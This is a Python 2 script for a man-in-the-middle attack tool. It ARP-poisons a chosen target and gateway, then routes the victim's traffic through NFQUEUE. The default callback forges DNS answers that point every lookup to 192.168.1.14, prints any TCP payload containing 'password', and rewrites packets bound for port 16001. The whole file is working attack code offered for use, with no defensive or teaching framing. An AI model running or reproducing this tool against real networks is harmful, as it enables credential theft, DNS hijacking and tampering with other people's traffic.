#!/usr/bin/python2
from __future__ import print_function
import os
import threading
import sys
import argparse
# import nfqueue
from netfilterqueue import NetfilterQueue
from scapy.all import *

from arp_attacker import ARP_attacker

parser = argparse.ArgumentParser(description='MiTM tool', usage='./mitm -i <interface> -t <target_ip> -g <gateway_ip>')
parser.add_argument('-i', '--interface', type=str, help='Interface to perform the attack on')
parser.add_argument('-t', '--target', type=str, help='Target IP to attack')
parser.add_argument('-g', '--gateway', type=str, help='Gateway IP address')
parser.add_argument('-f', '--filter', type=str, help='String to filter packets by')
parser.add_argument('-o', '--output', type=str, help='Capture file name', default='capture.pcap')
parser.add_argument('--callback', type=str, help='Name of a callback script')

args = parser.parse_args()

if args.interface is None or args.target is None or args.gateway is None:
    parser.print_help()
    sys.exit(0)

if args.callback is not None:
    args.callback = args.callback.replace('.py', '')
    callback = __import__(args.callback).callback
else:
    def callback(packet):
        acc = True
        pkt = IP(packet.get_payload())

        if pkt.haslayer(DNSQR):
            spoofed_pkt =   IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                            DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                            an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata='192.168.1.14'))
            send(spoofed_pkt)
            acc = False
            print('Sent' + spoofed_pkt.summary())

        if pkt.haslayer(TCP):
            if pkt.haslayer(Raw):
                if 'password' in pkt.load:
                    print(pkt.load)
            #print(pkt.summary())
            #if pkt.sport == 80 or pkt.dport == 80:
            #    print(pkt.summary())

                elif pkt[TCP].dport == 16001:
                    print(pkt.show())
                    pkt.load = b'3\n'
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    del pkt[IP].len
                    packet.set_payload(str(pkt))
        if acc:
            packet.accept()
        else:
            packet.drop()
        #if pkt.haslayer(DNSQR):
        #    pkt[IP].dst     = '192.168.1.14'
        #    pkt[IP].len     = len(str(pkt))
        #    pkt[UDP].len    = len(str(pkt[UDP]))
        #    del pkt[IP].chksum


interface       = args.interface
target_ip       = args.target
gateway_ip      = args.gateway

conf.iface      = interface
conf.verb       = 0
done            = False
filename        = args.output

if not args.output.endswith('.pcap'):
    filename += '.pcap'

print('[*] Enabling IP forwarding...')
os.system('sysctl -w net.ipv4.ip_forward=1')

print('[*] Setting up iptables...')
# os.system('iptables -I INPUT -s 192.168.1.0/24 -p tcp -j NFQUEUE --queue-num 1')
# os.system('iptables -I INPUT -d 192.168.1.0/24 -p tcp -j NFQUEUE --queue-num 1')

os.system('iptables -t mangle -I PREROUTING -j NFQUEUE --queue-num 1')
# os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 1')

# os.system('iptables -t mangle -I POSTROUTING -j NFQUEUE --queue-num 1')
# os.system('iptables -t mangle -A POSTROUTING -p udp -j NFQUEUE --queue-num 1')

# os.system('iptables -I OUTPUT -s 192.168.1.0/24 -p tcp -j NFQUEUE --queue-num 1')
# os.system('iptables -I OUTPUT -d 192.168.1.0/24 -p tcp -j NFQUEUE --queue-num 1')
# os.system('iptables -A OUTPUT -p tcp -j NFQUEUE --queue-num 1')
# os.system('iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 1')

arp = ARP_attacker(target_ip, gateway_ip)

if arp.target_mac is None:
    print('[-] Failed to get target MAC. Exiting.')
    sys.exit(0)

else:
    print('[+] Target {} is at {}'.format(arp.target_ip, arp.target_mac))

if arp.gateway_mac is None:
    print('[-] Failed to get gateway MAC. Exiting.')
    sys.exit(0)

else:
    print('[+] Gateway {} is at {}'.format(arp.gateway_ip, arp.gateway_mac))

print('[*] Poisoning...')

poison_thread = threading.Thread(target=arp.poison)
poison_thread.start()

nfqueue = NetfilterQueue()
nfqueue.bind(1, callback)

try:
    print('[*] Starting MITM... Press CTRL-C to stop.')
    nfqueue.run()

except KeyboardInterrupt:
    pass

finally:
    print('\r', end='')
    print('[*] Cleaning up...')

    arp.restore()
    nfqueue.unbind()
    os.system('sysctl -w net.ipv4.ip_forward=0')
    os.system('iptables -F')
    os.system('iptables -t mangle -F')

    print('[-] Exiting...')
